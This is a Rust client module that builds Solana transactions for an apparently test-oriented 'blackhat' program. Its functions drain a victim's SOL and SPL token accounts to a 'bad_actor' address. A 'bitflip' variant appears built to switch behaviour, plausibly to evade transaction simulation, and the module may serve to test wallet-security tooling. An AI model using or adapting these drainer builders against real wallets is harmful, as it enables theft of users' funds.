use anchor_lang::*;
use anchor_spl::associated_token;
use rand::{thread_rng, RngCore};
use solana_program::{instruction::Instruction, pubkey::Pubkey, system_program, sysvar};
use solana_sdk::signature::{Keypair, Signer};
use spl_associated_token_account::get_associated_token_address;

use crate::TxBuilder;

pub struct BlackhatProgram {}

impl BlackhatProgram {
    fn tx_builder(&self, ixs: Vec<Instruction>, payer: Pubkey) -> TxBuilder {
        TxBuilder {
            payer,
            ixs,
            look_up_tables: vec![],
        }
    }

    pub fn create_test_account(
        &self,
        payer: &Pubkey,
        account: &Keypair,
        random: bool,
    ) -> TxBuilder {
        let accounts = blackhat::accounts::CreateTestAccountV1 {
            system_program: system_program::id(),
            signer: *payer,
            test_account: account.pubkey(),
            rent: sysvar::rent::id(),
            slot_hashes: sysvar::slot_hashes::id(),
        };

        let data = blackhat::instruction::CreateTestAccountV1 { random };

        self.tx_builder(
            vec![Instruction {
                program_id: blackhat::id(),
                accounts: accounts.to_account_metas(None),
                data: data.data(),
            }],
            *payer,
        )
    }

    pub fn drain_solana(&mut self, victim: &Keypair, bad_actor: &Pubkey) -> TxBuilder {
        self.tx_builder(
            vec![Instruction {
                program_id: blackhat::id(),
                accounts: blackhat::accounts::DrainAccount {
                    system_program: system_program::id(),
                    victim: victim.pubkey(),
                    bad_actor: *bad_actor,
                }
                .to_account_metas(None),
                data: blackhat::instruction::DrainAccount {}.data(),
            }],
            victim.pubkey(),
        )
    }

    pub fn drain_token_account(
        &mut self,
        victim: &Keypair,
        bad_actor: &Pubkey,
        mint: &Pubkey,
    ) -> TxBuilder {
        let accounts = blackhat::accounts::DrainTokenAccount {
            system_program: system_program::id(),
            mint: *mint,
            victim: victim.pubkey(),
            victim_ata: get_associated_token_address(&victim.pubkey(), mint),
            bad_actor: *bad_actor,
            bad_actor_ata: get_associated_token_address(bad_actor, mint),
            associated_token_program: associated_token::ID,
            token_program: spl_token::id(),
        };

        let data = blackhat::instruction::DrainTokenAccount {};

        self.tx_builder(
            vec![Instruction {
                program_id: blackhat::id(),
                accounts: accounts.to_account_metas(None),
                data: data.data(),
            }],
            victim.pubkey(),
        )
    }

    pub fn enable_bitflip(&mut self, payer: &Keypair, pda_bytes: [u8; 32]) -> TxBuilder {
        let bit_flipper = find_bit_flipper(pda_bytes).0;

        let accounts = blackhat::accounts::EnableBitflip {
            signer: payer.pubkey(),
            bit_fipper: bit_flipper,
            rent: sysvar::rent::id(),
            system_program: system_program::id(),
        };

        let data = blackhat::instruction::EnableBitflip { pda_bytes };

        self.tx_builder(
            vec![Instruction {
                program_id: blackhat::id(),
                accounts: accounts.to_account_metas(None),
                data: data.data(),
            }],
            bit_flipper,
        )
    }

    pub fn bitflip_drain_token_account(
        &mut self,
        victim: &Keypair,
        bad_actor: &Pubkey,
        mint: &Pubkey,
        pda_bytes: [u8; 32],
    ) -> TxBuilder {
        let accounts = blackhat::accounts::BitflipDrainTokenAccount {
            victim: victim.pubkey(),
            bad_actor: *bad_actor,
            bit_flipper: find_bit_flipper(pda_bytes).0,
            mint: *mint,
            victim_ata: get_associated_token_address(&victim.pubkey(), mint),
            bad_actor_ata: get_associated_token_address(bad_actor, mint),
            system_program: system_program::id(),
            token_program: spl_token::id(),
            associated_token_program: associated_token::ID,
        };

        let data = blackhat::instruction::BitflipDrainTokenAccount {};

        self.tx_builder(
            vec![Instruction {
                program_id: blackhat::id(),
                accounts: accounts.to_account_metas(None),
                data: data.data(),
            }],
            victim.pubkey(),
        )
    }
}

pub fn find_bit_flipper(random_bytes: [u8; 32]) -> (solana_program::pubkey::Pubkey, u8) {
    solana_program::pubkey::Pubkey::find_program_address(&[&random_bytes], &blackhat::ID)
}
